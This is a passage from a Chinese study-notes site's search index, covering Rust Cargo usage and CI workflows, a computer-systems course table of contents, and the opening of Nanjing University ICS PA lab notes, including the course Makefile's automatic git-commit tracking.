\u7684\u65b9\u6cd5\u5373\u53ef</li> </ul> </li> </ul>"},{"location":"cs/pl/rust/misc/#reference","title":"Reference","text":"<ul> <li>Rust By Example</li> <li>Rust docs</li> </ul>"},{"location":"cs/pl/rust/misc/#cargo","title":"Cargo","text":"<ol> <li>\u5e38\u89c4\u9879\u76ee\u5e03\u5c40\uff1a     <pre><code>.\n\u251c\u2500\u2500 Cargo.lock\n\u251c\u2500\u2500 Cargo.toml\n\u251c\u2500\u2500 src/\n\u2502   \u251c\u2500\u2500 lib.rs\n\u2502   \u251c\u2500\u2500 main.rs\n\u2502   \u2514\u2500\u2500 bin/\n\u2502       \u251c\u2500\u2500 named-executable.rs\n\u2502       \u251c\u2500\u2500 another-executable.rs\n\u2502       \u2514\u2500\u2500 multi-file-executable/\n\u2502           \u251c\u2500\u2500 main.rs\n\u2502           \u2514\u2500\u2500 some_module.rs\n\u251c\u2500\u2500 benches/\n\u2502   \u251c\u2500\u2500 large-input.rs\n\u2502   \u2514\u2500\u2500 multi-file-bench/\n\u2502       \u251c\u2500\u2500 main.rs\n\u2502       \u2514\u2500\u2500 bench_module.rs\n\u251c\u2500\u2500 examples/\n\u2502   \u251c\u2500\u2500 simple.rs\n\u2502   \u2514\u2500\u2500 multi-file-example/\n\u2502       \u251c\u2500\u2500 main.rs\n\u2502       \u2514\u2500\u2500 ex_module.rs\n\u2514\u2500\u2500 tests/\n    \u251c\u2500\u2500 some-integration-tests.rs\n    \u2514\u2500\u2500 multi-file-test/\n        \u251c\u2500\u2500 main.rs\n        \u2514\u2500\u2500 test_module.rs\n</code></pre></li> <li>Cargo.toml \u4e0e Cargo.lock<ul> <li>Cargo.toml \u63cf\u8ff0\u4e86\u4f9d\u8d56\u7b49\u5143\u4fe1\u606f\uff0c\u662f\u624b\u52a8\u4fee\u6539\u7684</li> <li>Cargo.lock \u662f cargo \u81ea\u52a8\u7ef4\u62a4\u7684\u5173\u4e8e\u4f9d\u8d56\u7684\u66f4\u591a\u66f4\u51c6\u786e\u7684\u4fe1\u606f\uff08\u6bd4\u5982\u901a\u8fc7 git \u4e0b\u8f7d\u7684\u5305\u4f1a\u9644\u5e26 sha \u503c\uff09\uff0c\u4e0d\u5e94\u8be5\u88ab\u624b\u52a8\u4fee\u6539</li> <li>lib \u5305\u4e2d\u7684 Cargo.lock \u5e94\u8be5\u6dfb\u52a0\u5230 .gitignore \u4e2d\uff0c\u800c bin \u5305\u4e2d\u7684 Cargo.lock \u9700\u8981\u9644\u5e26\u4e0a\u4f20</li> </ul> </li> <li> <p>\u5b9e\u7528 GitHub Action \u811a\u672c</p> cargo book \u4e2d\u811a\u672c <pre><code>name: Cargo Build &amp; Test\n\non:\n  push:\n  pull_request:\n\nenv: \n  CARGO_TERM_COLOR: always\n\njobs:\n  build_and_test:\n    name: Rust project - latest\n    runs-on: ubuntu-latest\n    strategy:\n      matrix:\n        toolchain:\n          - stable\n          - beta\n          - nightly\n    steps:\n      - uses: actions/checkout@v3\n      - run: rustup update ${{ matrix.toolchain }} &amp;&amp; rustup default ${{ matrix.toolchain }}\n      - run: cargo build --verbose\n      - run: cargo test --verbose\n</code></pre> course.rs \u4e2d\u6d4b\u8bd5\u811a\u672c <pre><code>on: [push, pull_request]\n\nname: Continuous integration\n\njobs:\n  check:\n    name: Check\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v2\n      - uses: actions-rs/toolchain@v1\n        with:\n          profile: minimal\n          toolchain: stable\n          override: true\n      - run: cargo check\n\n  test:\n    name: Test Suite\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v2\n      - uses: actions-rs/toolchain@v1\n        with:\n          profile: minimal\n          toolchain: stable\n          override: true\n      - run: cargo test\n\n  fmt:\n    name: Rustfmt\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v2\n      - uses: actions-rs/toolchain@v1\n        with:\n          profile: minimal\n          toolchain: stable\n          override: true\n      - run: rustup component add rustfmt\n      - run: cargo fmt --all -- --check\n\n  clippy:\n    name: Clippy\n    runs-on: ubuntu-latest\n    steps:\n      - uses: actions/checkout@v2\n      - uses: actions-rs/toolchain@v1\n        with:\n          profile: minimal\n          toolchain: stable\n          override: true\n      - run: rustup component add clippy\n      - run: cargo clippy -- -D warnings\n</code></pre> <ol> <li>\u6307\u5b9a\u4f9d\u8d56 - \u9ed8\u8ba4\u4ece crates.io \u4e0a\u4e0b\u8f7d\uff0c\u53ea\u9700\u8981\u540d\u5b57\u548c\u7248\u672c\u53f7 - \u7248\u672c\u6307\u5b9a<ul> <li>\u7248\u672c\u53f7\u4f7f\u7528 SemVer \u89c4\u8303\uff0c\u5373 major.minor.patch</li> <li>\u4e00\u4e2a\u7248\u672c\u53f7\u89c4\u5b9a\u7684\u662f\u4e00\u4e2a\u7248\u672c\u8303\u56f4</li> <li>\u6700\u4f4e\u7248\u672c\u662f\u4e66\u5199\u51fa\u6765\u7684\u7248\u672c\uff0c\u6700\u9ad8\u7248\u672c\u4f1a\u4fdd\u8bc1\u6700\u5de6\u4fa7\u975e\u96f6\u7684\u7248\u672c\u53f7\u4e0d\u53d8\uff0c\u4f8b\uff1a     <pre><code>1.2.3  :=  &gt;=1.2.3, &lt;2.0.0\n1.2    :=  &gt;=1.2.0, &lt;2.0.0\n1      :=  &gt;=1.0.0, &lt;2.0.0\n0.2.3  :=  &gt;=0.2.3, &lt;0.3.0\n0.2    :=  &gt;=0.2.0, &lt;0.3.0\n0.0.3  :=  &gt;=0.0.3, &lt;0.0.4\n0.0    :=  &gt;=0.0.0, &lt;0.1.0\n0      :=  &gt;=0.0.0, &lt;1.0.0\n</code></pre><ul> <li>cargo update \u4e5f\u4f1a\u6309\u7167\u8fd9\u4e2a\u89c4\u8303\u66f4\u65b0\u5230\u5141\u8bb8\u7684\u6700\u9ad8\u7248\u672c\uff08\u5982 0.2.3 \u5982\u679c\u8981\u66f4\u65b0\u7684\u8bdd\uff0c\u4e14 0.2.5 \u662f\u6700\u65b0\u7684\u4ee5 0.2 \u5f00\u5934\u7684\u7248\u672c\uff0c\u5219\u53ea\u4f1a\u66f4\u65b0\u5230 0.2.5\uff09</li> </ul> </li> <li>\u6ce2\u6d6a\u53f7\uff1a     <pre><code>~1.2.3  := &gt;=1.2.3, &lt;1.3.0\n~1.2    := &gt;=1.2.0, &lt;1.3.0\n~1      := &gt;=1.0.0, &lt;2.0.0\n</code></pre></li> <li>\u901a\u914d\u7b26\uff1a     <pre><code>*     := &gt;=0.0.0\n1.*   := &gt;=1.0.0, &lt;2.0.0\n1.2.* := &gt;=1.2.0, &lt;1.3.0\n</code></pre></li> <li>\u4e5f\u53ef\u4ee5\u4f7f\u7528\u5927\u4e8e\u7b49\u4e8e\u5c0f\u4e8e\u53f7\uff0c\u4ee5\u53ca\u9017\u53f7\u5206\u9694\u7684\u591a\u4e2a\u9650\u5b9a\u5199\u6cd5</li> <li>\u66f4\u6362 registry <pre><code>some-crate = { version = \"1.0\", registry = \"my-registry\" }\n</code></pre></li> <li>\u901a\u8fc7 git \u83b7\u53d6 <pre><code>regex = { git = \"https://github.com/rust-lang/regex\" }\nregex = { git = \"https://github.com/rust-lang/regex\", branch = \"next\" }\n</code></pre></li> <li>\u4ece\u672c\u5730\u8def\u5f84\u83b7\u53d6\uff08\u76f8\u5bf9\u8def\u5f84\u76f8\u5bf9\u4e8e Cargo.toml\uff09 <pre><code>some-crate = { path = \"...\" }\nsome-crate = { path = \"...\", version = \"...\" }\n</code></pre></li> <li>publish \u7684\u8bdd\u9700\u8981\u5148\u5c06 some-crate publish</li> <li>\u6307\u5b9a\u4e86 version \u7684\u8bdd publish \u7684\u65f6\u5019\u4f1a\u4f7f\u7528 crates.io \u4e0a\u7684\u8fd9\u4e2a\u7248\u672c\uff0c\u5176\u5b83\u65f6\u5019\u4f7f\u7528\u672c\u5730\u7248\u672c</li> <li>\u5206\u5e73\u53f0\uff1a <pre><code>[target.'cfg(windows)'.dependencies]\ninhttp = \"0.4.0\"\n\n[target.'cfg(unix)'.dependencies]\npenssl = \"1.0.1\"\n\n[target.'cfg(target_arch = \"x86\")'.dependencies]\native-i686 = { path = \"native/i686\" }\n\n[target.'cfg(target_arch = \"x86_64\")'.dependencies]\native-x86_64 = { path = \"native/x86_64\" }\n</code></pre></li> </ul> </li> </ol> </li> </ol>"},{"location":"cs/pl/rust/misc/#reference_1","title":"Reference","text":"<ul> <li>The Cargo Book\u3001\u4e2d\u6587\u7ffb\u8bd1\u7248 Cargo \u624b\u518c</li> </ul>"},{"location":"cs/system/","title":"\u8ba1\u7b97\u673a\u7cfb\u7edf","text":"<p>Abstract</p> <p>\u8ba1\u7b97\u673a\u7cfb\u7edf\u76f8\u5173\u5b66\u4e60\u7b14\u8bb0\u3002\u5305\u62ec\uff1a</p> <ul> <li>\u6d59\u6c5f\u5927\u5b66 \u201c\u8ba1\u7b97\u673a\u7cfb\u7edf\u201d \u7cfb\u5217\u4e13\u4e1a\u8bfe\u7a0b\u7b14\u8bb0\u53ca\u76f8\u5173\u77e5\u8bc6</li> <li>\u5357\u4eac\u5927\u5b66\u8ba1\u7b97\u673a\u7cfb\u7edf\u57fa\u7840\u5b9e\u9a8c\uff08ICS PA\uff09\u7eaa\u5b9e</li> </ul>"},{"location":"cs/system/#table-of-contents","title":"Table of Contents","text":""},{"location":"cs/system/#_2","title":"\u7406\u8bba\u90e8\u5206","text":"<ul> <li>\u8ba1\u7b97\u673a\u7cfb\u7edf \u2160<ul> <li>\u6570\u5b57\u7684\u8868\u793a\u548c\u5904\u7406</li> <li>\u6570\u5b57\u903b\u8f91\u57fa\u7840\uff08TODO\uff09</li> <li>\u7ec4\u5408\u903b\u8f91\u7535\u8def\u8bbe\u8ba1\uff08TODO\uff09</li> <li>\u65f6\u5e8f\u903b\u8f91\u7535\u8def\u8bbe\u8ba1\uff08TODO\uff09</li> <li>\u6307\u4ee4\u96c6\u4f53\u7cfb\u7ed3\u6784</li> <li>\u5904\u7406\u5668\uff08TODO\uff09</li> </ul> </li> <li>\u8ba1\u7b97\u673a\u7cfb\u7edf \u2161<ul> <li>\u6d41\u6c34\u7ebf CPU</li> <li>\u64cd\u4f5c\u7cfb\u7edf\u7b80\u4ecb</li> <li>\u64cd\u4f5c\u7cfb\u7edf\u7ed3\u6784\u53ca\u7cfb\u7edf\u8c03\u7528</li> <li>\u8fdb\u7a0b\u4e0e\u7ebf\u7a0b</li> <li>CPU \u8c03\u5ea6</li> <li>\u8fdb\u7a0b\u540c\u6b65</li> </ul> </li> </ul> <p>PS\uff1a\u8fd9\u91cc\u7684 TODO \u5927\u6982\u7387\u4e0d\u4f1a\u518d\u5199\u4e86\uff0c\u9664\u975e\u5f53\u52a9\u6559\uff08x</p>"},{"location":"cs/system/#_3","title":"\u5b9e\u9a8c\u90e8\u5206","text":"<ul> <li>\u8ba1\u7b97\u673a\u7cfb\u7edf \u2160<ul> <li>lab1-1: \u56db\u4f4d\u5168\u52a0\u5668\u548c\u4e03\u6bb5\u7ba1\u8bd1\u7801\u5668</li> <li>lab1-2: \u591a\u8def\u9009\u62e9\u5668\u7684\u8bbe\u8ba1\u548c\u6d4b\u8bd5</li> <li>lab2-1: \u590d\u6742\u64cd\u4f5c\uff1a\u52a0\u6cd5\u5668</li> <li>lab2-2: \u590d\u6742\u64cd\u4f5c\uff1a\u4e58\u6cd5\u5668</li> <li>lab3: \u4e03\u6bb5\u7ba1\u663e\u793a\u5668</li> <li>lab4-1: RISC-V \u6c47\u7f16\u5b9e\u9a8c</li> <li>lab4-2: overflow \u7406\u89e3</li> <li>lab5-1: \u5355\u5468\u671f CPU \u6570\u636e\u901a\u8def\u8bbe\u8ba1</li> <li>lab5-2: \u5355\u5468\u671f CPU \u8bbe\u8ba1</li> </ul> </li> <li>\u8ba1\u7b97\u673a\u7cfb\u7edf \u2161<ul> <li>lab1: \u6d41\u6c34\u7ebf CPU \u8bbe\u8ba1</li> <li>lab2: \u6d41\u6c34\u7ebf\u5192\u9669\u5904\u7406</li> <li>lab3: GDB+QEMU \u8c03\u8bd5 64 \u4f4d RISC-V LINUX</li> <li>lab4: RV64 \u5185\u6838\u5f15\u5bfc</li> <li>lab5: RV64 \u65f6\u949f\u4e2d\u65ad\u5904\u7406</li> <li>lab6: RV64 \u5185\u6838\u7ebf\u7a0b\u8c03\u5ea6</li> <li>lab7: \u7efc\u5408\u5b9e\u9a8c\uff08\u7279\u6743\u7ea7 CPU\uff09</li> </ul> </li> <li>\u8ba1\u7b97\u673a\u7cfb\u7edf \u2162<ul> <li>lab1: \u52a8\u6001\u5206\u652f\u9884\u6d4b</li> <li>lab2: Cache \u8bbe\u8ba1</li> <li>lab3: RV64 \u865a\u62df\u5185\u5b58\u7ba1\u7406</li> <li>lab4: RV64 \u7528\u6237\u6a21\u5f0f</li> <li>lab5: RV64 \u7f3a\u9875\u5f02\u5e38\u5904\u7406\u4ee5\u53ca fork \u673a\u5236</li> <li>Xpart: \u8f6f\u786c\u4ef6\u7efc\u5408\u8d2f\u901a\u5b9e\u9a8c\uff08\u5c55\u793a slides \ud83d\udd17\uff09</li> </ul> </li> <li>\u5357\u4eac\u5927\u5b66 ICS PA \u5b9e\u9a8c\u7eaa\u5b9e</li> </ul>"},{"location":"cs/system/pa/","title":"\u5357\u4eac\u5927\u5b66 ICS PA \u5b9e\u9a8c\u7eaa\u5b9e","text":"<p> \u7ea6 7088 \u4e2a\u5b57  196 \u884c\u4ee3\u7801  2 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 26 \u5206\u949f</p> <p>Abstract</p> <p>\u5357\u4eac\u5927\u5b66\u8ba1\u7b97\u673a\u7cfb\u7edf\u57fa\u7840\u8bfe\u7a0b\u5b9e\u9a8c\u3002</p> <p>\u5b9e\u9a8c\u6307\u5bfc\u6587\u6863\uff1ahttps://nju-projectn.github.io/ics-pa-gitbook/ics2022/</p> <p>\u4e00\u4e2a\u4e00\u76f4\u542c\u670b\u53cb\u3001\u5b66\u957f\u79f0\u8d5e\u7684\u5b9e\u9a8c\uff0c\u5bd2\u5047\u505a\u4e86\u4e00\u4e0b\uff0c\u5f88\u723d\uff0c\u4e5f\u5b66\u5230\u4e86\u4e00\u4e9b\uff0c\u8fd9\u91cc\u4f1a\u8bb0\u5f55\u4e00\u4e0b\u5b66\u5230\u7684\u96f6\u6563\u4e1c\u897f\u4ee5\u53ca\u4e00\u4e9b\u75db\u82e6 debug \u7ecf\u5386\uff08</p> <p>\u5bf9\u4e8e\u8fd9\u5957\u5b9e\u9a8c\u8fd8\u662f\u5f15\u53d1\u4e86\u6211\u7684\u4e00\u4e9b\u601d\u8003\u7684\uff0c\u76f8\u5173\u611f\u609f\u548c\u601d\u8003\u5728 blog \u4e0a\uff1a\u300c\u6742\u8c08\u300d\u7531 PA \u5b9e\u9a8c\u5f15\u53d1\u7684\u4e00\u4e9b\u601d\u8003</p>"},{"location":"cs/system/pa/#_1","title":"\u5b9e\u9a8c\u6982\u8ff0","text":"<p>\u6574\u4e2a\u5b9e\u9a8c\u9010\u6b65\u5f15\u5bfc\u5b8c\u6210\u4e00\u4e2a\u8ba1\u7b97\u673a\u7cfb\u7edf\u7684\u6784\u5efa\uff0c\u5305\u62ec\u5e95\u5c42\u7684 NEMU \u6a21\u62df\u5668\uff0c\u8fd0\u884c\u65f6\u73af\u5883 AbstractMachine\uff08AM\uff09\uff0c\u5728\u5176\u4e0a\u7684\u7b80\u6613\u64cd\u4f5c\u7cfb\u7edf NanOS-lite\uff0c\u4ee5\u53ca\u64cd\u4f5c\u7cfb\u7edf\u4e0a\u7684\u5e94\u7528\u7a0b\u5e8f\u5e93 Navy-apps\u3002</p> <p>\u4e00\u5171\u5206\u4e3a 5 \u4e2a\u90e8\u5206\uff0cPA0 \u914d\u7f6e\u73af\u5883\uff0cPA1 \u5b8c\u5584 NEMU \u7684\u8c03\u8bd5\u5668\u529f\u80fd\uff0cPA2 \u6a21\u62df NEMU \u6307\u4ee4\u8fd0\u884c\u4ee5\u53ca\u8865\u5145 AM\uff0cPA3 \u5b8c\u5584 NEMU \u7684\u4e2d\u65ad/\u5f02\u5e38\u5904\u7406\u3001\u5b9e\u73b0\u64cd\u4f5c\u7cfb\u7edf\u7684\u7cfb\u7edf\u8c03\u7528\u4ee5\u53ca\u7b80\u6613\u6587\u4ef6\u7cfb\u7edf\u529f\u80fd\uff0cPA4 \u5728\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u5b9e\u73b0\u591a\u9053\u7a0b\u5e8f\u7684\u8fd0\u884c\u3001\u865a\u62df\u5185\u5b58\u7ba1\u7406\u4ee5\u53ca\u5916\u90e8\u4e2d\u65ad\u5904\u7406\u3002</p> <p>\u7ec6\u5206\u6bcf\u4e2a\u5b9e\u9a8c\u7684\u5185\u5bb9\u4ee5\u53ca\u6d89\u53ca\u5230\u7684\u6e90\u7801\u90e8\u5206\uff0c\u6211\u6574\u7406\u4e86\u5982\u4e0b\u4e00\u4e2a\u8868\u683c\u4f9b\u53c2\u8003\uff1a</p> <p> </p> <p>PS\uff1a\u5176\u4e2d AM \u7531\u4e94\u4e2a\u90e8\u5206\u7ec4\u6210\uff0cTRM\uff08\u56fe\u7075\u673a\u6a21\u62df\uff09\u7b80\u5355\u800c\u4e14\u5df2\u7ecf\u5b9e\u73b0\u597d\u4e86\uff0cIOE \u4e3a\u8f93\u5165\u8f93\u51fa\u6269\u5c55\uff0cCTE \u4e3a\u4e0a\u4e0b\u6587\u7ba1\u7406\u6269\u5c55\uff0cVME \u4e3a\u865a\u62df\u5185\u5b58\u7ba1\u7406\u6269\u5c55\uff0c\u8fd8\u6709\u4e00\u4e2a MPE\uff08\u591a\u5904\u7406\u5668\u6269\u5c55\uff09\u5728 PA \u4e2d\u4e0d\u4f7f\u7528\u3002klib \u4e3a\u7b80\u5355\u7684\u8fd0\u884c\u65f6\u5e93\uff0c\u63d0\u4f9b\u7ed9 AM \u548c\u64cd\u4f5c\u7cfb\u7edf\u4f7f\u7528\u3002</p> <p>\u603b\u800c\u8a00\u4e4b\u6709\u4e86\u8ba1\u7b97\u673a\u7cfb\u7edf\u8bfe\u4ee5\u53ca RISCV \u624b\u518c\u9605\u8bfb\u7684\u57fa\u7840\uff0c\u5927\u90e8\u5206\u5b9e\u9a8c\u8fd8\u662f\u6bd4\u8f83\u8f7b\u677e\u7684\uff0c\u6ca1\u6709\u4ec0\u4e48\u96be\u4ee5\u7406\u89e3\u7684\u5730\u65b9\u3002\u8f83\u4e3a\u75db\u82e6\u7684\u5c31\u662f debug \u65f6\u4e00\u4e9b\u5947\u602a\u7684\u95ee\u9898\u4ee5\u53ca\u6700\u540e PA4 \u4e2d\u4e4b\u524d\u6ca1\u6709\u63a5\u89e6\u8fc7\u7684\u865a\u5b58\u7ba1\u7406\u7684\u5185\u5bb9\u4e86\u3002\u540e\u9762\u8bb0\u5f55\u4e00\u4e9b\u8fd8\u80fd\u56de\u5fc6\u8d77\u6765\u7684\u95ee\u9898\uff08\u5176\u5b9e\u662f\u505a\u7684\u8fc7\u7a0b\u4e2d\u61d2\u5f97\u8bb0\u5f55\uff09\u3002</p>"},{"location":"cs/system/pa/#pa0","title":"PA0","text":"<p>\u8fd9\u90e8\u5206\u5c31\u662f\u914d\u7f6e Linux \u73af\u5883\u4ee5\u53ca\u83b7\u53d6\u6e90\u7801\u3002Ubuntu \u5b89\u88c5\u5c31\u8fd8\u662f\u6b63\u5e38\uff0cUltraISO \u51c6\u5907\u542f\u52a8\u76d8\uff0c\u7136\u540e\u8fdb BIOS \u4ece U \u76d8\u542f\u52a8\uff0c\u6839\u636e\u6307\u5bfc\u5b89\u88c5\u3002\u8fd9\u6b21\u9047\u5230\u7684\u51e0\u4e2a\u8054\u60f3\u7684\u5751\uff08\u6211\u7684 win \u7535\u8111\u662f\u8054\u60f3\u5c0f\u65b0 Air 14+\uff09\uff1a</p> <ul> <li>\u8054\u60f3\u4f1a\u81ea\u52a8\u5f00\u542f BitLocker \u4fdd\u62a4\u78c1\u76d8\uff0c\u8fd9\u79cd\u60c5\u51b5\u4e0b Ubuntu \u65e0\u6cd5\u5b89\u88c5\uff0c\u9700\u8981\u56de\u5230 Win \u4e2d\u5173\u6389 BitLocker\uff08\u65f6\u95f4\u8f83\u957f\uff09</li> <li>\u6211\u8fd9\u53f0\u8054\u60f3\u5f00\u673a\u4f1a\u7acb\u5373\u542f\u52a8 Windows\uff0c\u6ca1\u6709\u8054\u60f3 Logo \u9875\u9762\uff08Windows \u5f00\u673a\u754c\u9762\u7684 Windows \u88ab\u66ff\u6362\u6210\u4e86\u8054\u60f3\u5c0f\u65b0\uff0c\u8fd9\u4e0d\u7b97\u5f00\u673a logo \u7684\u90e8\u5206\uff09\uff0c\u6240\u4ee5\u8981\u5728\u6309\u4e0b\u7535\u6e90\u952e\u540e\u9a6c\u4e0a\u6309 F2 \u624d\u80fd\u8fdb\u5165 BIOS<ul> <li>\u800c\u4e14\u90a3\u4e2a FnLock \u5728\u8fd9\u4e2a\u65f6\u5019\u6709\u6ca1\u6709\u7528\u4e0d\u6e05\u695a\uff0cFn+F2 \u4e0d\u884c\u5c31\u5355\u72ec F2</li> </ul> </li> <li>\u6211\u8fd9\u53f0\u7684 BIOS \u754c\u9762\u662f\u201c\u4f18\u5316\u201d\u8fc7\u7684\uff0c\u4e0d\u662f\u8001\u5f0f\u90a3\u79cd\u84dd\u7070\u754c\u9762\uff0c\u751a\u81f3\u542f\u52a8\u9879\u91cc\u627e\u4e0d\u5230 USB\uff0c\u4e0d\u80fd\u901a\u8fc7\u8fd9\u79cd\u65b9\u5f0f\u542f\u52a8<ul> <li>\u6b63\u786e\u64cd\u4f5c\u662f\u5728\u5173\u673a\u60c5\u51b5\u4e0b\u76f4\u63a5\u6309 F12 \u53f3\u4fa7\u7684\u201c\u4e94\u89d2\u661fS\u201d\u7279\u6b8a\u529f\u80fd\u952e\uff0c\u4fbf\u4f1a\u51fa\u73b0\u9875\u9762\u76f4\u63a5\u9009\u62e9\u8fdb\u5165 BIOS \u8fd8\u662f\u9009\u62e9\u542f\u52a8\u65b9\u5f0f\uff0c\u8fd9\u91cc\u5c31\u6709 USB \u4e86</li> </ul> </li> </ul> <p>\u5173\u4e8e Ubuntu \u7684\u914d\u7f6e\uff0c\u6211\u7684\u6d41\u7a0b\u5927\u6982\u5c31\u662f\uff1a</p> <ul> <li>\u5b89\u88c5\u4e00\u7cfb\u5217\u5b57\u4f53\uff0c\u6539\u58c1\u7eb8</li> <li>\u88c5 gnome tweaks \u8c03\u7cfb\u7edf\u5b57\u4f53\u548c\u7a97\u53e3\u4e09\u4e2a\u6309\u94ae\uff08\u5173\u95ed\u9690\u85cf\u6700\u5927\u5316\uff09\u8c03\u5230\u5de6\u4e0a\u89d2</li> <li>\u6362 zsh\uff0c\u88c5 oh-my-zsh\u3001powerlevel10k \u4e3b\u9898\u4ee5\u53ca\u63d2\u4ef6\uff0c\u6dfb\u52a0 vim \u914d\u7f6e</li> <li>\u88c5\u4e00\u4e9b\u547d\u4ee4\u884c\u5e38\u7528\u7684\u5de5\u5177</li> <li>\u88c5\u4e2d\u6587\u8f93\u5165\u6cd5</li> <li>\u88c5 V2rayN\uff0c\u5728 FireFox \u4e0a\u7528 Bing \u641c\u7d22\u5b89\u88c5 Chrome\uff0c\u5b89\u88c5 vscode\uff0c\u5e76\u540c\u6b65\u8bbe\u7f6e</li> </ul> <p>\u51e0\u4e2a Ubuntu \u4e0a\u8fd8\u6ca1\u641e\u597d\u7684\u95ee\u9898\uff1a</p> <ul> <li>\u60f3\u8981\u7981\u7528 Logi MX Master 2S \u9f20\u6807\u7684\u65e0\u9650\u6eda\u52a8\uff0c\u4f46\u6ca1\u6709 Options\uff0c\u7f51\u4f20\u7684 Solaar \u5de5\u5177\u91cc\u4e5f\u627e\u4e0d\u5230\u8fd9\u4e00\u8bbe\u7f6e</li> <li>\u60f3\u8981\u4fee\u6539 CapsLk \u7684\u884c\u4e3a\u5230\u4e0e mac \u4e00\u81f4\uff0cwin \u4e0a\u6709 AutoHotkey \u53ef\u4ee5\u7528\uff0cLinux \u4e0a\u6ca1\u627e\u5230\u597d\u7528\u7684\u66ff\u4ee3<ul> <li>\u5176\u5b9e tweaks \u91cc\u6709\u8bbe\u7f6e\u53ef\u4ee5\u66f4\u6539 CapsLk \u7684\u884c\u4e3a\uff0c\u4f46\u662f\u8c8c\u4f3c\u6ca1\u6709\u6548\u679c\uff0c\u5927\u6982\u662f\u4e2a bug\uff0c\u53ef\u4ee5\u641c\u5230\u7c7b\u4f3c bug \u4f46\u6ca1\u770b\u5230\u89e3\u51b3\u529e\u6cd5</li> </ul> </li> </ul> <p>\u53cd\u6b63\u9f13\u6363\u4e86\u534a\u5929\u5c31\u80fd\u7528\u5c31\u884c\u4e86\u3002</p>"},{"location":"cs/system/pa/#git","title":"\u5b9e\u9a8c\u4ee3\u7801 git \u8ddf\u8e2a","text":"<p>\u6574\u5957\u5b9e\u9a8c\u4ee3\u7801\u6709\u4e00\u4e2a\u5f88\u6709\u8da3\u5f88\u795e\u5947\u7684\u529f\u80fd\uff0c\u5c31\u662f\u5728\u6bcf\u6b21\u7f16\u8bd1\u3001\u8fd0\u884c\u7684\u65f6\u5019\u90fd\u4f1a\u81ea\u52a8\u63d0\u4ea4\u4fee\u6539\uff0c\u5e76\u751f\u6210\u4e00\u6761 commit\u3002PA \u4e2d\u79f0\u4e4b\u4e3a\u201c\u5f00\u53d1\u8ddf\u8e2a\u201d\uff0c\u901a\u8fc7\u8fd9\u4e2a\u624b\u6bb5\u6765\u8bb0\u5f55\u5b9e\u9a8c\u6d41\u7a0b\uff0c\u5e76\u68c0\u67e5\u662f\u5426\u5b58\u5728\u4f5c\u5f0a\u884c\u4e3a\u3002</p> <p>\u8fd9\u4e00\u529f\u80fd\u7684\u5b9e\u73b0\u5f97\u76ca\u4e8e\u6574\u4e2a\u6846\u67b6\u90fd\u4f7f\u7528\u63d0\u4f9b\u597d\u7684 Makefile\uff0c\u4e14\u7f16\u8bd1\u8fd0\u884c\u90fd\u901a\u8fc7 make \u6765\u8fdb\u884c\u3002\u5176\u539f\u7406\u4e3a\uff1a</p> <ul> <li>\u6839\u76ee\u5f55\u4e0b Makefile\uff1a     <pre><code>STUID = ...\nSTUNAME = ...\n\nGITFLAGS = -q --author='tracer-ics2022 &lt;tracer@njuics.org&gt;' --no-verify --allow-empty\n\ndefine git_commit\n    -@git add $(NEMU_HOME)/.. -A --ignore-errors\n    -@while (test -e .git/index.lock); do sleep 0.1; done\n    -@(echo \"&gt; $(1)\" &amp;&amp; echo $(STUID) $(STUNAME) &amp;&amp; uname -a &amp;&amp; uptime) | git commit -F - $(GITFLAGS)\n    -@sync\nendef\n</code></pre><ul> <li>\u5b9a\u4e49\u4e86\u4e00\u4e2a\u51fd\u6570 git_commit<ul> <li>add \u6240\u6709\u5185\u5bb9\uff08NEMU_HOME/.. \u5373\u4e3a\u5b9e\u9a8c\u6839\u76ee\u5f55\uff09\u5e76\u786e\u4fdd\u5b8c\u6210</li> <li>\u5c06\u53c2\u6570\u3001\u5b66\u53f7\u59d3\u540d\u3001\u7cfb\u7edf\u4fe1\u606f\u4f5c\u4e3a commit message \u8fdb\u884c commit\uff0cauthor \u5728 GITFLAGS \u4e2d\u6307\u5b9a</li> </ul> </li> </ul> </li> <li>NEMU \u7684\u76f8\u5173 Makefile\uff1a     <pre><code>-include $(NEMU_HOME)/../Makefile\n\ncompile_git: \n    $(call git_commit, \"compile NEMU\")\n$(BINARY): compile_git\n\nrun-env: $(BINARY) $(DIFF_REF_SO)\nrun: run-env\n    $(call git_commit, \"run NEMU\")\n    $(NEMU_EXEC)\ngdb: run-env\n    $(call git_commit, \"gdb NEMU\")\n    gdb -s $(BINARY) --args $(NEMU_EXEC)\n</code></pre><ul> <li>\u5bfc\u5165\u4e86\u524d\u9762\u7684 Makefile</li> <li>\u7f16\u8bd1\u65f6\u6dfb\u52a0\u4e86\u4f9d\u8d56 compile_git\uff0c\u5176\u4e2d\u4f1a\u8c03\u7528 git_commit \u51fd\u6570\u8fdb\u884c commit\uff0cmsg \u5f00\u5934\u4e3a\u53c2\u6570 compile NEMU</li> <li>\u5bf9\u4e8e run \u548c gdb\uff0c\u5728\u7f16\u8bd1\u540e\u3001\u8fd0\u884c\u524d\u8fd8\u4f1a\u591a\u52a0\u4e00\u6761 run NEMU \u6216 gdb NEMU \u7684\u7a7a commit msg \u4f5c\u4e3a\u8bb0\u5f55</li> </ul> </li> </ul> <p>\u7531\u4e8e\u5b9e\u9a8c\u4ece\u5934\u5230\u5c3e\u90fd\u8dd1\u5728 NEMU \u4e0a\uff08native \u6d4b\u8bd5\u4e0d\u7b97\uff09\uff0c\u6240\u4ee5\u6bcf\u6b21\u4fee\u6539\u3001\u8fd0\u884c\u90fd\u4f1a\u7ecf\u8fc7\u8fd9\u4e9b\u90e8\u5206\uff0c\u8fdb\u884c commit \u8bb0\u5f55\uff0c\u8fbe\u5230\u81ea\u52a8\u8ddf\u8e2a\u7684\u76ee\u7684\u3002</p>"},{"location":"cs/system/pa/#pa1","title":"PA1","text":""},{"location":"cs/system/pa/#pa11","title":"PA1.1","text":"<p>PA1.1 \u5b9e\u9645\u9700\u8981\u5199\u7684\u90e8\u5206\u5f88\u7b80\u5355\uff0c\u53ea\u8981\u8bfb\u8bfb\u6e90\u7801\u5c31\u80fd\u5199\u51fa\u6765\u3002\u5728\u8bfb\u6e90\u7801\u7684\u65f6\u5019\u53d1\u73b0\u4e86\u4e00\u4e2a\u5f88\u6709\u610f\u601d\u7684\u5e93\u51fd\u6570 